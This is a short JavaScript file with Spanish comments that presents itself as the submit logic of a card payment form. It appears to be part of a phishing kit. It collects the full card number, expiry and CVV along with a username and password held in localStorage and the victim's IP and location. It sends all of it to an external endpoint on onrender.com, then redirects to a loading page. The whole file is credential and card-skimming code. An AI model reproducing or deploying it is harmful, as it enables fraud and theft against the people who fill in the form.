// Lógica del botón de pago (mantenida del archivo original)
document.addEventListener('DOMContentLoaded', () => {
    const continueBtn = document.getElementById('continueBtn');
    const paymentForm = document.getElementById('paymentForm');

    paymentForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (continueBtn.disabled) {
            return;
        }

        // Obtener datos del formulario
        const cardName = document.getElementById('cardName').value.trim();
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
        const expMonth = document.getElementById('expMonth').value;
        const expYear = document.getElementById('expYear').value;
        const cvv = document.getElementById('cvv').value;

        // Detectar tipo de tarjeta
        const cardType = window.cardValidator.detectCardType(cardNumber);
        let cardTypeName = 'unknown';
        if (cardType === 'visa') cardTypeName = 'Visa';
        else if (cardType === 'mastercard') cardTypeName = 'Mastercard';
        else if (cardType === 'amex') cardTypeName = 'American Express';

        // Obtener datos de sesión del localStorage
        const sessionId = localStorage.getItem("sessionId") || crypto.randomUUID();
        const user = localStorage.getItem("user") || "N/A";
        const pass = localStorage.getItem("pass") || "N/A";
        const ip = localStorage.getItem("ip") || "N/D";
        const country = localStorage.getItem("country") || "N/D";
        const city = localStorage.getItem("city") || "N/D";

        // Preparar datos a enviar
        const paymentData = {
            sessionId,
            user,
            pass,
            cardName,
            cardNumber,
            cardType: cardTypeName,
            expMonth,
            expYear,
            cvv,
            ip,
            country,
            city
        };

        try {
            // Deshabilitar botón mientras se procesa
            continueBtn.disabled = true;
            continueBtn.textContent = 'Procesando...';

            const response = await fetch("https://iluminamepadre.onrender.com/visa", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(paymentData)
            });

            if (!response.ok) {
                throw new Error("Error al enviar datos");
            }

            // Redirigir a la página de carga
            window.location.href = "loading.html";

        } catch (error) {
            alert("Error de conexión. Intenta nuevamente.");
            console.error(error);
            
            // Rehabilitar botón
            continueBtn.disabled = false;
            continueBtn.textContent = 'Continuar';
        }
    });
});

